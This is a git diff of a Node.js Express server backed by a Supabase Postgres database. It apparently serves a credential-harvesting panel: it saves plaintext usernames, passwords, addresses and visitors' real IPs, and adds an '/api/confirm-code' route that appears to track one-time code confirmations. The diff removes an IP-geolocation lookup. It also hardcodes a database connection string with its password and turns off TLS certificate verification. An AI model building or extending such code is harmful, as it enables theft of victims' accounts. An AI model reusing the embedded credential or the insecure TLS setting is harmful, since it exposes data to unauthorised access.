@@ -5,12 +5,12 @@ const { Pool } = require('pg');
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
 // Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
-
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -18,7 +18,6 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     password TEXT,
     address TEXT,
     ip TEXT,
-    location TEXT,
     timestamp TEXT
 )`);
 
@@ -29,17 +28,6 @@ function getRealIP(req) {
            'Unknown';
 }
 
-async function getLocation(ip) {
-    if (!ip || ip === 'Unknown') return 'Unknown';
-    try {
-        const res = await fetch(`https://ipapi.co/${ip}/json/`);
-        const data = await res.json();
-        if (data && data.country_name) {
-            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`.trim();
-        }
-    } catch (e) {}
-    return 'Unknown Location';
-}
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
@@ -87,4 +75,17 @@ app.post('/api/clear', async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running`);
+});
+// Add this route in server.js
+app.post('/api/confirm-code', async (req, res) => {
+    const { id, status } = req.body;
+    try {
+        await pool.query(
+            "UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2",
+            [status, id]
+        );
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ success: false });
+    }
 });
